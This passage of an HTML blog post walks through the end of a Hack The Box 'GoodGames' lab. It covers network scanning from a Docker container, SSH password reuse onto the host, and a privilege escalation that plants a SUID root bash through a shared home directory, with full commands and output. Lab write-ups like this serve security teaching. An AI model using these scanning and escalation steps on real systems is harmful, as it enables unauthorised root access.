+</span></code></pre></div></div>
+<h4 id="network">Network</h4>
+<p>A quick ping sweep of the class C shows only one other host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.19.0.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Unreachable"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+<span class="go">64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.124 ms
+64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.087 ms
+</span></code></pre></div></div>
+<p>It’s a safe guess that .1 is the Docker host.</p>
+<p>A quick port scan shows it’s listening on 22 and 80:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span><span class="k">for </span>port <span class="k">in</span> <span class="o">{</span>1..65535<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="o">&gt;</span> /dev/tcp/172.19.0.1/<span class="nv">$port</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$port</span><span class="s2"> open"</span><span class="p">;</span> <span class="k">done </span>2&gt;/dev/null           
+<span class="go">22 open
+80 open
+</span></code></pre></div></div>
+<p>A quick <code class="language-plaintext highlighter-rouge">curl</code> of <code class="language-plaintext highlighter-rouge">172.19.0.1</code> returns the website, which suggests that port is being forwarded back to this container through the host.</p>
+<h3 id="ssh">SSH</h3>
+<p>I’ll check for password reuse, and it works for augustus on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:~#</span><span class="w"> </span>ssh augustus@172.19.0.1 
+<span class="go">The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
+augustus@172.19.0.1's password:
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+</span><span class="gp">augustus@GoodGames:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="host">Host</h4>
+<p>This shell does seem to be on GoodGames itself. The IP matches the machine’s IP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">hostname</span> <span class="nt">-I</span>
+<span class="go">10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:809b 
+</span></code></pre></div></div>
+<p>Docker is in the process list, and it matches what I suspected from the container’s point of view:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>docker
+<span class="go">root       908  0.0  2.1 1457176 86204 ?       Ssl  02:40   0:09 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1246  0.0  0.2 1222636 9616 ?        Sl   02:40   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8085 -container-ip 172.19.0.2 -container-port 8085
+</span></code></pre></div></div>
+<h4 id="home-directory">Home Directory</h4>
+<p>Augustus’ home directory looks the same as what I saw in the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwxr-xr-x 2 augustus augustus 4096 Dec  2 23:51 .
+drwxr-xr-x 3 root     root     4096 Oct 19 12:16 ..
+lrwxrwxrwx 1 root     root        9 Nov  3 10:16 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 augustus augustus  220 Oct 19 12:16 .bash_logout
+-rw-r--r-- 1 augustus augustus 3526 Oct 19 12:16 .bashrc
+-rw-r--r-- 1 augustus augustus  807 Oct 19 12:16 .profile
+-rw-r----- 1 root     augustus   33 Feb 22 02:41 user.txt
+</span></code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwxr-xr-x 2 1000 1000 4096 Dec  2 23:51 .
+drwxr-xr-x 1 root root 4096 Nov  5 15:23 ..
+lrwxrwxrwx 1 root root    9 Nov  3 10:16 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 1000 1000  220 Oct 19 11:16 .bash_logout
+-rw-r--r-- 1 1000 1000 3526 Oct 19 11:16 .bashrc
+-rw-r--r-- 1 1000 1000  807 Oct 19 11:16 .profile
+-rw-r----- 1 root 1000   33 Feb 22 02:41 user.txt
+</span></code></pre></div></div>
+<p>The file sizes and times are exactly the same (almost - I cannot explain why three of the files are off by an hour). If I create a file on the host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">touch </span>from_host
+</code></pre></div></div>
+<p>It shows up on the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> from_host 
+<span class="go">-rw-r--r-- 1 1000 1000 0 Feb 22 15:16 from_host
+</span></code></pre></div></div>
+<p>And it works the other way:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">touch </span>from_container
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> from_container 
+<span class="go">-rw-r--r-- 1 root root 0 Feb 22 15:16 from_container
+</span></code></pre></div></div>
+<p>Interestingly, the file created from the container is owned by root, and the host treats it as it’s root!</p>
+<h3 id="shell-1">Shell</h3>
+<p>I’ll copy <code class="language-plaintext highlighter-rouge">/bin/bash</code> into augustus’ home directory on the host. It’s important to use <code class="language-plaintext highlighter-rouge">bash</code> from the host (I’ll cover why in <a href="#beyond-root">Beyond Root</a>).</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+</code></pre></div></div>
+<p>Then in the container, I’ll change the owner to root, and set the permissions to be SUID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> bash 
+<span class="go">-rwxr-xr-x 1 1000 1000 1234376 Feb 22 15:25 bash
+</span><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">chown </span>root:root bash 
+<span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">chmod </span>4777 bash 
+<span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> bash
+<span class="go">-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash
+</span></code></pre></div></div>
+<p>Back on GoodGames, the changes are reflected:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> bash 
+<span class="go">-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash
+</span></code></pre></div></div>
+<p>Running it (with <code class="language-plaintext highlighter-rouge">-p</code> so that privileges aren’t dropped) returns a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span>./bash <span class="nt">-p</span>
+<span class="go">bash-5.1# 
+</span></code></pre></div></div>
+<p>And I can fetch the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.1#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">820d1e82************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<p>The first time I tried to escalate here, I copied the <code class="language-plaintext highlighter-rouge">bash</code> binary from in the container into augustus’ home directory and made it SUID:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+<span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">chmod </span>4777 bash 
+<span class="gp">root@3a453ab39d3d:/home/augustus#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> bash 
+<span class="go">-rwsrwxrwx 1 root root 1099016 Feb 22 15:18 bash
+</span></code></pre></div></div>
+<p>It shows up the same way on GoodGames:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> bash 
+<span class="go">-rwsrwxrwx 1 root root 1099016 Feb 22 15:18 bash
+</span></code></pre></div></div>
+<p>But running it errors out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span>./bash <span class="nt">-p</span>
+<span class="go">./bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
+</span></code></pre></div></div>
+<p>Running <code class="language-plaintext highlighter-rouge">ldd</code> shows how this binary loads libraries:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span>ldd bash 
+<span class="go">        linux-vdso.so.1 (0x00007ffc64194000)
+        libtinfo.so.5 =&gt; not found
+        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa964fc8000)
+        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa964e03000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fa964fd7000)
+</span></code></pre></div></div>
+<p>It clearly shows that <code class="language-plaintext highlighter-rouge">libtinfo.so.5</code> is not found. The standard <code class="language-plaintext highlighter-rouge">bash</code> binary on the host is using <code class="language-plaintext highlighter-rouge">libtinfo.so.6</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">augustus@GoodGames:~$</span><span class="w"> </span>ldd /bin/bash
+<span class="go">        linux-vdso.so.1 (0x00007ffd31e97000)
+        libtinfo.so.6 =&gt; /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f28239dd000)
+        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f28239d7000)
+        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2823812000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f2823b4e000)
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/02/23/htb-goodgames.html"></a>
+</article>
